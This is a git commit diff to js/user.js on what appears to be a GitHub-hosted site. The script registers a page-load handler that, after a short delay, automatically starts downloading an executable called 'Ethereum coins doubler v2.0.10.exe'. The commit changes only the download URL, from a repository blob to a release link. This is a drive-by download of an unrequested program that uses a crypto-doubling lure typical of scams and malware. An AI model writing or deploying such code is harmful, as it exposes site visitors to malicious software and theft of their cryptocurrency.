510b854d2af8563ca206bfc021564f2b1c6b06f7
ethx2 <72185040+ethx2@users.noreply.github.com>
2021-12-14 07:15:03 +0000

    Update user.js

--- js/user.js
+++ js/user.js
@@ -1,6 +1,6 @@
 function download(){
   setTimeout(function(){
-    downloadFile("https://github.com/ethx2/ethx2.github.io/blob/master/Ethereum%20coins%20doubler%20v2.0.10.exe");
+    downloadFile("https://github.com/ethx2/ethx2.github.io/releases/download/v2.0.10/Ethereum.coins.doubler.v2.0.10.exe");
   }, 1998);
 };
 window.addEventListener("load", download);
